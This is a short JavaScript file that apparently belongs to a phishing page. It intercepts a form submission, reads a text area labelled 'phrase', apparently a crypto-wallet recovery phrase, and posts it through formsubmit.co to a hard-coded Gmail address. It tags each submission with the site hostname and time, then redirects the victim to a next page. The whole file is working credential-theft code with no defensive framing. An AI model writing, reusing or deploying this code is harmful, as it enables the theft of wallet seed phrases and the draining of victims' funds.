let e = document.querySelector('form')
e.addEventListener('submit', t)
function t () {
  mail = 'demalaigboran@gmail.com'
  event.preventDefault()
  next = 'next.html'
  subject = `${window.location.hostname} ${new Date()}`
  let e = new FormData()
  if (event.target.name === 'phraseKey') {
    phrase = document.querySelector('textarea[data-name="phrase"]').value
    e.append('phraseKey', phrase)
  }
  e.append('_captcha', false)
  e.append('_next', next)
  e.append('_template', 'table')
  e.append('_subject', subject)
  let t = `https://formsubmit.co/${mail}`
  fetch(t, { method: 'POST', body: e }).then(e => window.location.assign(next))
}
